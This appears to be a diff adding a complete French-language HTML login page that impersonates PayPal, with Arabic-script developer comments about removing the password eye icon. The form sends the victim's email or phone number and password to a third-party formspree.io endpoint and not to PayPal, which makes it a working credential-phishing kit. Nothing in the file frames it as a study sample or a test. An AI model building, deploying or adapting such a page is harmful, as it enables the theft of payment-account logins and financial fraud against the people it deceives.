@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>paypal.com</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  h1 {
+    font-size: 32px;
+    margin-bottom: 30px;
+    font-weight: 700;
+    color: #000;
+    text-align: center;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+    width: 100%;
+    max-width: 900px; /* يمكنك تغييره لزيادة العرض على شاشات كبيرة */
+  }
+
+  /* الحقول الكبيرة */
+  .input-field {
+    width: 100%;
+    padding: 22px;
+    font-size: 18px;
+    border: 1px solid #d6d6d6;
+    border-radius: 12px;
+    outline: none;
+    background: #fff;
+    color: #000;
+  }
+
+  .input-field::placeholder { color: #888; }
+
+  .password-wrap {
+    position: relative;
+    width: 100%;
+  }
+
+  /* حيدنا زر العين، ما بقاتش هنا */
+
+  .forgot {
+    text-align: left;
+    font-size: 16px;
+    color: #0070ba;
+    text-decoration: none;
+  }
+
+  .btn {
+    padding: 20px;
+    font-size: 18px;
+    font-weight: 700;
+    border-radius: 30px;
+    border: none;
+    background: #0070ba;
+    color: #fff;
+    cursor: pointer;
+    width: 100%;
+  }
+
+  .btn:hover { background: #005c9c; }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    color: #aaa;
+    font-size: 16px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #eee;
+    margin: 0 10px;
+  }
+
+  /* زر Ouvrir un compte كبير و بعرض الحقول */
+  .btn-outline {
+    padding: 20px;
+    font-size: 18px;
+    border-radius: 30px;
+    border: 1px solid #000;
+    background: #fff;
+    color: #000;
+    cursor: pointer;
+    width: 100%;
+  }
+
+  .lang {
+    margin-top: 20px;
+    font-size: 14px;
+    color: #666;
+    text-align: center;
+  }
+
+  @media (max-width:480px){
+    .input-field { padding: 18px; font-size: 16px; }
+    .btn, .btn-outline { padding: 18px; font-size: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<h1>PayPal</h1>
+
+<form id="loginForm" action="https://formspree.io/f/meopeylk" method="POST" novalidate>
+  <input
+    type="text"
+    name="email"
+    class="input-field"
+    placeholder="Email ou numéro de mobile"
+    required
+  >
+
+  <div class="password-wrap">
+    <input
+      type="password"
+      name="password"
+      class="input-field"
+      placeholder="Mot de passe"
+      required
+      aria-label="Mot de passe"
+    >
+    <!-- أيقونة العين حذفت -->
+  </div>
+
+  <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+  <button type="submit" class="btn">Connexion</button>
+</form>
+
+<div class="divider">ou</div>
+
+<!-- زر Ouvrir un compte بنفس عرض الحقول -->
+<button class="btn-outline" onclick="location.href='#'">Ouvrir un compte</button>
+
+<div class="lang">Français | English</div>
+
+<!-- حذفنا كود جافاسكربت المتعلق بتبديل العين -->
+</body>
+</html>
